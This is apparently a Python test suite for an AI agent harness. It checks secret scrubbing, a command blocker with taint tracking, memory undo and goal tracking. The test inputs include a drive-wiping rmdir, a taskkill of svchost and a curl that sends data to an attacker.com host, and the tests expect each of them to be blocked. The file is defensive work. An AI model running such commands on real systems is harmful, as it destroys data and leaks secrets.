import json
import tempfile
import time
import unittest
from pathlib import Path
from unittest.mock import MagicMock, patch

from core import config
from core.goals import GoalManager, parse_cadence
from core.harness import AgentHarness, assess_command
from core.memory import MiniMemory
from core.process import clean_environment, run_bounded


class AgentEnhancementsTest(unittest.TestCase):
    def setUp(self):
        self.temp = tempfile.TemporaryDirectory()
        self.root = Path(self.temp.name)
        self.patch = patch.object(config, "CONFIG_FILE_PATH", self.root / "config.json")
        self.patch.start()
        config._cache = None
        config._stamp = None
        self.memory = MiniMemory(self.root / "memory.db")

    def tearDown(self):
        self.patch.stop()
        config._cache = None
        config._stamp = None
        self.temp.cleanup()

    # ---------------- 1. Security: Environment Scrubbing ----------------
    def test_clean_environment(self):
        dirty_env = {
            "PATH": "C:\\Windows\\system32",
            "USERPROFILE": "C:\\Users\\admin",
            "OPENAI_API_KEY": "sk-secret123",
            "VLLM_API_KEY": "sk-vsr-key456",
            "NAPCAT_TOKEN": "token_abc",
            "MY_PASSWORD": "rootpassword",
            "AWS_SECRET_ACCESS_KEY": "awssecret",
            "NORMAL_VAR": "hello",
        }
        cleaned = clean_environment(dirty_env)
        self.assertIn("PATH", cleaned)
        self.assertIn("USERPROFILE", cleaned)
        self.assertIn("NORMAL_VAR", cleaned)
        self.assertNotIn("OPENAI_API_KEY", cleaned)
        self.assertNotIn("VLLM_API_KEY", cleaned)
        self.assertNotIn("NAPCAT_TOKEN", cleaned)
        self.assertNotIn("MY_PASSWORD", cleaned)
        self.assertNotIn("AWS_SECRET_ACCESS_KEY", cleaned)

    # ---------------- 2. Security: Command Assessment & Taint Tracking ----------------
    def test_assess_command_destructive(self):
        # Destructive command should be blocked
        res1 = assess_command("rmdir /s /q C:\\", is_tainted=False)
        self.assertFalse(res1["allowed"])
        self.assertIn("高危系统破坏性", res1["reason"])

        res2 = assess_command("taskkill /f /im svchost.exe", is_tainted=False)
        self.assertFalse(res2["allowed"])

        # Normal command should be allowed
        res3 = assess_command("dir", is_tainted=False)
        self.assertTrue(res3["allowed"])

    def test_assess_command_taint_tracking(self):
        # Untainted session can run curl / git
        res_untainted = assess_command("curl https://api.github.com", is_tainted=False)
        self.assertTrue(res_untainted["allowed"])

        # Tainted session running egress must be blocked by taint tracking
        res_tainted = assess_command("curl https://attacker.com/leak", is_tainted=True)
        self.assertFalse(res_tainted["allowed"])
        self.assertIn("污点追踪", res_tainted["reason"])

        res_tainted2 = assess_command("Invoke-WebRequest -Uri http://test.com", is_tainted=True)
        self.assertFalse(res_tainted2["allowed"])

        # Local command in tainted session is still allowed
        res_local = assess_command("dir", is_tainted=True)
        self.assertTrue(res_local["allowed"])

    # ---------------- 3. Memory: Change Log & Undo ----------------
    def test_memory_change_log_and_undo(self):
        # Add fact
        self.memory.set_fact("preferred_editor", "VS Code")
        self.assertEqual(self.memory.get_all_facts()["preferred_editor"], "VS Code")

        # Update fact
        self.memory.set_fact("preferred_editor", "Neovim")
        self.assertEqual(self.memory.get_all_facts()["preferred_editor"], "Neovim")

        # Undo update
        undo_res = self.memory.undo_last_fact_change()
        self.assertTrue(undo_res["ok"])
        self.assertEqual(self.memory.get_all_facts()["preferred_editor"], "VS Code")

        # Delete fact
        self.memory.delete_fact("preferred_editor")
        self.assertNotIn("preferred_editor", self.memory.get_all_facts())

        # Undo delete
        undo_res2 = self.memory.undo_last_fact_change()
        self.assertTrue(undo_res2["ok"])
        self.assertEqual(self.memory.get_all_facts()["preferred_editor"], "VS Code")

    # ---------------- 4. Memory: Consolidate Guardrails ----------------
    def test_consolidate_facts_guardrails(self):
        # Setup facts
        self.memory.set_fact("seat_flight", "偏好飞机靠窗位置", source="agent")
        self.memory.set_fact("seat_train", "偏好高铁靠窗位置", source="agent")

        # 1. Hallucination check: introducing brand new words not in source
        bad_merge = self.memory.consolidate_facts(
            "seat_pref",
            "极度厌恶坐飞机喜欢去上海买特斯拉汽车",
            ["seat_flight", "seat_train"],
        )
        self.assertFalse(bad_merge["ok"])
        self.assertIn("防幻觉拦截", bad_merge["error"])

        # 2. Legitimate consolidation within token bag
        good_merge = self.memory.consolidate_facts(
            "seat_pref",
            "偏好飞机和高铁靠窗位置",
            ["seat_flight", "seat_train"],
        )
        self.assertTrue(good_merge["ok"])
        facts = self.memory.get_all_facts()
        self.assertIn("seat_pref", facts)
        self.assertNotIn("seat_flight", facts)
        self.assertNotIn("seat_train", facts)

        # 3. Undo consolidation
        undo_res = self.memory.undo_last_fact_change()
        self.assertTrue(undo_res["ok"])
        facts_after_undo = self.memory.get_all_facts()
        self.assertIn("seat_flight", facts_after_undo)
        self.assertIn("seat_train", facts_after_undo)
        self.assertNotIn("seat_pref", facts_after_undo)

        # 4. User-explicit protection: cannot merge user explicit facts without force
        self.memory.set_fact("home_city", "北京", source="user_explicit")
        self.memory.set_fact("work_city", "北京海淀", source="agent")
        explicit_blocked = self.memory.consolidate_facts(
            "city", "居住在北京海淀", ["home_city", "work_city"]
        )
        self.assertFalse(explicit_blocked["ok"])
        self.assertIn("用户显式指定的事实", explicit_blocked["error"])

    # ---------------- 5. Goals: Long-horizon Goal System ----------------
    def test_goals_manager(self):
        mgr = GoalManager(self.memory)

        # Create goal
        steps = ["环境调研与需求分析", "编写代码与单测", "部署并发布上线"]
        goal = mgr.create_goal(
            title="重构核心模块",
            category="coding",
            steps=steps,
            cadence="daily 09:00",
        )
        self.assertIsNotNone(goal)
        self.assertEqual(len(goal["steps"]), 3)
        self.assertEqual(goal["steps"][0]["title"], "环境调研与需求分析")
        self.assertEqual(goal["steps"][0]["status"], "pending")

        # Update step
        upd = mgr.update_step(goal["id"], 1, "done", evidence="已完成调研文档")
        self.assertTrue(upd["ok"])
        self.assertFalse(upd["all_done"])

        # Propose revision
        proposal = mgr.propose_revision(
            goal["id"],
            new_steps=[{"id": 2, "title": "调整为轻量方案"}],
            reason="遇到兼容性瓶颈",
        )
        self.assertTrue(proposal["ok"])
        self.assertTrue(proposal["proposal"])

        # Finish remaining steps
        mgr.update_step(goal["id"], 2, "done")
        final_upd = mgr.update_step(goal["id"], 3, "done")
        self.assertTrue(final_upd["ok"])
        self.assertTrue(final_upd["all_done"])
        self.assertEqual(final_upd["goal_status"], "done")

        # Summary prompt
        mgr.create_goal(title="背诵六级词汇", category="learning", steps=["第1单元", "第2单元"])
        summary = mgr.format_goals_summary()
        self.assertIn("背诵六级词汇", summary)
        self.assertIn("第1单元", summary)

    # ---------------- 6. Harness Tool Execution ----------------
    def test_harness_manage_goal_and_undo_memory(self):
        brain = MagicMock()
        jev = MagicMock()
        perception = MagicMock()
        skills = MagicMock()
        skills.describe.return_value = []
        harness = AgentHarness(brain, jev, self.memory, perception, skills)

        # 1. Manage goal tool execution
        create_res = harness._execute_tool(
            "manage_goal",
            {
                "action": "create",
                "title": "软考备考",
                "category": "learning",
                "steps": ["梳理大纲", "做模拟卷"],
            },
        )
        self.assertTrue(create_res["ok"])
        goal_id = create_res["goal"]["id"]

        list_res = harness._execute_tool("manage_goal", {"action": "list"})
        self.assertTrue(list_res["ok"])
        self.assertEqual(list_res["count"], 1)

        # 2. Undo memory tool execution
        self.memory.set_fact("test_key", "test_val")
        self.assertIn("test_key", self.memory.get_all_facts())
        undo_res = harness._execute_tool("undo_memory", {})
        self.assertTrue(undo_res["ok"])
        self.assertNotIn("test_key", self.memory.get_all_facts())

        # 3. Read file taint trigger
        dummy_config = self.root / "config.json"
        dummy_config.write_text("{\"vlm\": {}}", encoding="utf-8")
        self.assertFalse(harness.is_tainted("session_1"))
        harness._execute_tool("read_file", {"file_path": str(dummy_config)}, session_id="session_1")
        self.assertTrue(harness.is_tainted("session_1"))


if __name__ == "__main__":
    unittest.main()
